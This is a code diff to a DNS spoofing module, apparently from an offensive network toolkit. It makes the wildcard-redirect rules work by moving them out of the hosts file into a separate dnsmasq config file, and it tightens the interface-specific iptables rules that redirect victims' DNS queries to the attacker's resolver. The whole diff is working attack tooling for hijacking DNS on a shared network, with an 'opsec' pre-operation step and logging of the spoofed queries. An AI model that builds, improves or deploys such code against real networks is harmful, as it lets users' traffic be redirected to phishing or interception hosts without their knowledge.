@@ -40,6 +40,7 @@ class DnsSpoofModule:
         self.spoofed_queries: list[SpoofedQuery] = []
         self._running = False
         self._proc: subprocess.Popen | None = None
+        self._interface: str | None = None
 
     def add_rule(self, domain: str, redirect_ip: str, wildcard: bool = False) -> None:
         rule = SpoofRule(domain=domain, redirect_ip=redirect_ip, wildcard=wildcard)
@@ -55,23 +56,28 @@ class DnsSpoofModule:
 
         self.opsec.pre_operation()
         self._running = True
+        self._interface = interface
 
-        hosts_content = self._build_hosts_file()
-        hosts_path = "/tmp/voidfreq_dns_hosts"
-        with open(hosts_path, "w") as f:
-            f.write(hosts_content)
+        hosts_path, extra_conf_path = self._build_config_files()
 
         self._redirect_dns(interface)
 
+        cmd = [
+            "sudo", "dnsmasq",
+            "--no-daemon",
+            "--no-resolv",
+            f"--interface={interface}",
+            "--server=8.8.8.8",
+            "--log-queries",
+            "--log-facility=-",
+        ]
+        if hosts_path:
+            cmd.append(f"--addn-hosts={hosts_path}")
+        if extra_conf_path:
+            cmd.append(f"--conf-file={extra_conf_path}")
+
         self._proc = subprocess.Popen(
-            ["sudo", "dnsmasq",
-             "--no-daemon",
-             "--no-resolv",
-             f"--interface={interface}",
-             "--server=8.8.8.8",
-             f"--addn-hosts={hosts_path}",
-             "--log-queries",
-             "--log-facility=-"],
+            cmd,
             stdout=subprocess.PIPE,
             stderr=subprocess.STDOUT,
             text=True,
@@ -96,18 +102,34 @@ class DnsSpoofModule:
         import os
         with contextlib.suppress(FileNotFoundError):
             os.unlink("/tmp/voidfreq_dns_hosts")
+        with contextlib.suppress(FileNotFoundError):
+            os.unlink("/tmp/voidfreq_dns_extra.conf")
 
         console.print(f"[yellow]DNS spoofing stopped — {len(self.spoofed_queries)} queries spoofed[/yellow]")
         return self.spoofed_queries
 
-    def _build_hosts_file(self) -> str:
-        lines = []
+    def _build_config_files(self) -> tuple[str | None, str | None]:
+        hosts_lines = []
+        conf_lines = []
         for rule in self.rules:
             if rule.wildcard:
-                lines.append(f"address=/.{rule.domain}/{rule.redirect_ip}")
+                conf_lines.append(f"address=/.{rule.domain}/{rule.redirect_ip}")
             else:
-                lines.append(f"{rule.redirect_ip} {rule.domain}")
-        return "\n".join(lines) + "\n"
+                hosts_lines.append(f"{rule.redirect_ip} {rule.domain}")
+
+        hosts_path = None
+        if hosts_lines:
+            hosts_path = "/tmp/voidfreq_dns_hosts"
+            with open(hosts_path, "w") as f:
+                f.write("\n".join(hosts_lines) + "\n")
+
+        conf_path = None
+        if conf_lines:
+            conf_path = "/tmp/voidfreq_dns_extra.conf"
+            with open(conf_path, "w") as f:
+                f.write("\n".join(conf_lines) + "\n")
+
+        return hosts_path, conf_path
 
     def _redirect_dns(self, interface: str) -> None:
         subprocess.run(
@@ -124,15 +146,17 @@ class DnsSpoofModule:
         )
 
     def _restore_dns(self) -> None:
+        if not self._interface:
+            return
         subprocess.run(
             ["sudo", "iptables", "-t", "nat", "-D", "PREROUTING",
-             "-p", "udp", "--dport", "53",
+             "-i", self._interface, "-p", "udp", "--dport", "53",
              "-j", "REDIRECT", "--to-port", "53"],
             capture_output=True,
         )
         subprocess.run(
             ["sudo", "iptables", "-t", "nat", "-D", "PREROUTING",
-             "-p", "tcp", "--dport", "53",
+             "-i", self._interface, "-p", "tcp", "--dport", "53",
              "-j", "REDIRECT", "--to-port", "53"],
             capture_output=True,
         )
